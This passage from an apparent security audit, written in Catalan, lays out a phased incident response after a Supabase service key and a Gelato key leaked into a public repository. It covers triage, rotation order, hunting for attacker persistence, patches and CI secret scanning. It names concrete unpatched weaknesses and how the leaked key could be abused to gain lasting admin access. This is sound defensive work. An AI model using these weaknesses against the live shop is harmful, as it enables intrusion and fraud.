**Finestra d'exposició:** el secret es va introduir al commit `939f4dc` el **5 de juny de 2026** i el repositori és públic des del 27 de gener de 2026. Fa més de **tres mesos** que és accessible. No hi ha forquilles ni estrelles al repositori, cosa lleugerament tranquil·litzadora, però els escànners automàtics de secrets de GitHub no necessiten forquilles: rastregen commits públics de manera contínua. **Cal assumir compromís total, no "potser ningú ho ha vist".**

---

### Fase 0 — Triatge (avui, 30 minuts)

Tres comprovacions barates que determinen si estàs en mode incident o en mode neteja. **No toquis res abans de fer-les**, perquè una d'elles pot ser el problema més car de tots.

| # | Comprovació | Com | Si la resposta és dolenta |
|---|---|---|---|
| 0.1 | **Les claus JWT legacy estan desactivades a Supabase?** | Dashboard → Settings → API → *Legacy API keys* | Si estan actives, el JWT filtrat és viu: incident P0. Si estan revocades, la fuita queda continguda i això passa a ser neteja |
| 0.2 | **Stripe és en mode live a producció?** | `npx netlify-cli env:list --context production` | Si són `_test_`, qualsevol pot generar comandes reals a Gelato amb la targeta `4242…` sense que entri cap diner. És el risc econòmic més directe de tots |
| 0.3 | **Les RLS estan aplicades a producció?** | Executar `supabase/migrations/000_preflight_check.sql` | Si `20260826100000` no s'ha aplicat, `media_pages` és editable per qualsevol usuari registrat: poden redirigir tota la botiga |

### Fase 1 — Contenció (avui, 2-3 h)

L'**ordre importa** per no tombar la producció. No es tracta només de crear una clau nova: cal revocar l'antiga, i això és el pas que la gent oblida.

1. **Crear la clau nova a Supabase** (no esborris l'antiga encara).
2. **Actualitzar `SUPABASE_SERVICE_ROLE_KEY` a Netlify** i redesplegar.
3. **Verificar que el lloc funciona**: checkout complet de prova, panell admin, pujada de fitxer, webhook.
4. **Revocar la clau antiga** al panell de Supabase i desactivar les claus JWT legacy.
5. **Repetir el mateix cicle amb la clau de Gelato**: crear → desplegar → verificar → revocar.

> **Nota:** el `.env` local fa servir el format nou `sb_secret_…`. Si en el triatge (0.1) confirmes que les claus legacy ja estaven desactivades, el JWT del repositori és mort i la Fase 1 es redueix a rotar la clau de Gelato.

### Fase 2 — Investigació (24-48 h)

**La prioritat número u no és la clau: és el que un atacant hagi pogut deixar-hi.** Amb `service_role` es pot escriure a qualsevol taula, i això permet crear **persistència que sobreviu a la rotació de la clau**:

1. **`staff` — comprova-ho primer.** Amb la clau filtrada, algú podia inserir una fila a `staff` i crear-se un usuari d'autenticació. Això li donaria accés admin permanent a través del panell **encara que rotis la clau avui**. Qualsevol fila que no reconeguis és un incident actiu, no una troballa.
2. **`auth.users`** — registres inesperats, especialment amb el correu de l'administrador o dominis estranys.
3. **Logs d'accés de Supabase** (Dashboard → Logs) des del 5 de juny de 2026: pics de tràfic, accessos des d'IP desconegudes, consultes a `orders` o `profiles`.
4. **Integritat de dades**: `products` i `media_pages` (defacement), `orders` (comandes falses o modificades), `shipping_config` i `pricing_config` (manipulació de preus).
5. **Storage**: objectes nous als buckets `media` i `project-downloads`.
6. **Si Stripe resulta ser en mode test** (0.2): revisar **totes** les comandes des del 5 de juny i creuar-les amb els pagaments reals de Stripe.

### Fase 3 — Aturar la pèrdua econòmica (setmana 1)

Aquestes són les que perden diners, i per això van abans que la resta de troballes tècniques:

| # | Acció | Referència |
|---|---|---|
| 3.1 | Corregir el flux d'adreça d'enviament perquè Gelato rebi les dades completes | C3 |
| 3.2 | Afegir una alerta a l'admin quan una comanda quedi `confirmada` sense `gelato_order_id` | C3 |
| 3.3 | Confirmar les claus de Stripe live i, si cal, migrar | M6 |
| 3.4 | Auditar les comandes històriques que hagin quedat òrfenes de fulfillment | C3 |

### Fase 4 — Pedaços barats (setmana 1-2)

Correccions petites, de risc baix i impacte alt. Es fan en una tarda:

| # | Acció | Esforç | Referència |
|---|---|---|---|
| 4.1 | Canviar el fail-open d'`isAllowedAdminEmail` per `return false` | 1 línia | A1 |
| 4.2 | Llista blanca al redirect de `/ec-preview-lite` | poques línies | A2 |
| 4.3 | Eliminar la política d'inserció anònima a `rate_limit_log` | 1 migració | A5 |
| 4.4 | Validar l'email i sanejar capçaleres a `send-message.js` | poques línies | A4 |
| 4.5 | `execFileSync` + `host: '127.0.0.1'` a `vite.config.js` | poques línies | A3 |
| 4.6 | `npm i react-router-dom@6.30.6` | 1 comanda | A7 |
| 4.7 | `dist-prod` al `.gitignore` i `git rm -r --cached dist-prod` | 1 comanda | M7 |
| 4.8 | Autenticar les accions no admin de `gelato-proxy` i tancar-ne el CORS | mitjà | A6 |

### Fase 5 — Prevenció de recurrència (setmana 2) — **la més important a llarg termini**

Sense això, tornarà a passar. La causa arrel no és la clau filtrada: és que **no hi havia cap barrera** que ho impedís. No existeix cap CI, i `scripts/verify-security.js` només mira `src/` i `.env` — per això no va detectar res.

1. **Afegir un escànner de secrets al CI** (`gitleaks` o `trufflehog`) sobre l'historial complet i sobre cada PR.
2. **Ampliar `verify-security.js`** perquè escanegi `scripts/`, `docs/` i les arrels del projecte, no només `src/`.
3. **Afegir un hook `pre-commit`** que bloquegi commits amb patrons de secrets.
4. **Decidir si el repositori ha de continuar sent públic.** Si no hi ha una raó forta, fer-lo privat és defensa en profunditat.
5. **Purgar l'historial** (`git filter-repo`/BFG) i fer force-push — **després** de la rotació, mai abans.
6. Esborrar les claus dels fitxers versionats i deixar-los com a plantilla.

> **Sobre purgar l'historial:** és el que tothom fa primer i no serveix de res. **No des-filtra res**: un secret publicat tres mesos en un repositori públic s'ha de considerar cremat per sempre. La rotació és l'única mesura efectiva; la purga només evita que futurs clons i escànners el trobin. Per això va al final i no al principi.

### Fase 6 — Cua llarga (aquest mes)

7. CSP amb nonces/hashes en lloc d'`unsafe-inline` (M1) i eliminar el sink `innerHTML` (M2).
8. Substituir `sanitizeHtml` per DOMPurify (M3).
9. Idempotència real a `create-payment-intent` (M8) i validació d'import/estat al webhook (M9).
10. `maskAllText: true` a Sentry Replay (M5) i revisió de la base legal del tractament.
11. Minimitzar els camps retornats per `orders.js` (M4).
12. Escapar la sortida JSON-LD de `SEO.jsx`/`SEOProductSchema.jsx` (M13).
13. Validar tipus i mida de fitxers al client i corregir el bearer de `storage.js` (M14); decidir què fer amb els adjunts del formulari de contacte (M15).
14. Moure `postcss`/`tailwindcss` a `devDependencies` i actualitzar el toolchain (B1, B2).
15. Migrar a `react-router` v7.18+ i actualitzar Stripe.js (B3).
16. Crear una política de retenció per a `rate_limit_log` i `messages`.

### Què NO fer ara

Un pla també és decidir què no es toca. Aquestes coses són legítimes però **no ara**, perquè no aporten seguretat immediata i consumeixen l'energia que necessiten les fases 0 a 2:

- **Migrar a React 19 / react-router v7 / Tailwind 4.** Risc de regressió alt, benefici de seguretat nul a curt termini.
- **Arreglar les 94 vulnerabilitats de `npm audit`.** Gairebé totes són del toolchain de dev i no arriben al bundle. És soroll que enterra el que importa.
- **Refactoritzar `sanitizeHtml` o la CSP.** Importants, però no hi ha cap XSS demostrat explotable avui; les claus sí que són exploitables ara mateix.
- **Purgar l'historial de Git** abans de la rotació. És el pas que dóna falsa sensació de seguretat.

---

## 9. Comprovacions que no s'han pogut fer

Honestedat sobre els límits d'aquesta diagnosi:

1. **Si les claus filtrades segueixen actives.** Requeriria fer una crida a l'API de producció amb una credencial filtrada; s'ha evitat deliberadament. Cal verificar-ho al panell de Supabase i de Gelato.
2. **Si les migracions RLS estan aplicades a producció.** El codi de les migracions és correcte, però no hi ha manera de saber des del repositori si s'han executat. **Si `20260826100000` no s'ha aplicat, la migració anterior deixava taules com `media_pages` amb escriptura per a qualsevol usuari autenticat**, cosa que permetria redirigir tota la botiga. És la comprovació més urgent després de la rotació. Executa `supabase/migrations/000_preflight_check.sql`, que existeix precisament per a això.
3. **Quines variables d'entorn té configurades Netlify a producció.** Determinant per a M6.
4. **Si el repositori ha estat clonat o indexat per tercers** abans d'avui.
5. **Cap prova dinàmica d'explotació.** Tot és anàlisi estàtica; no s'ha executat l'aplicació ni s'ha provat cap exploit.
6. **L'interior de `backup-complet-2026-08-11.bundle`** (1,4 GB), no escanejat. El `.env` no hi és a l'historial, però no s'ha verificat el contingut del bundle.

---

## 10. Conclusió

L'equip ha fet una feina tècnica seriosa: la reescriptura del checkout cap a un model server-side, la migració RLS amb `is_admin()`, la idempotència de webhooks i els tokens de seguiment amb hash són solucions de nivell professional, i el fet que `docs/checkout-security-v1-design.md` i `000_preflight_check.sql` existeixin demostra que hi ha hagut una reflexió conscient sobre seguretat.

El que falla és el **procediment operatiu**: un script de configuració amb secrets en clar va acabar versionat en un repositori públic, i la clau de Gelato va arribar fins al bundle del navegador. Cap d'aquests errors és de disseny; tots dos es corregeixen amb rotació de claus i un escàner de secrets al CI.

**Ordre d'actuació:** rotar les dues claus avui, verificar les claus de Stripe i l'aplicació de les RLS, i després resoldre la resta seguint el pla de la secció 8.
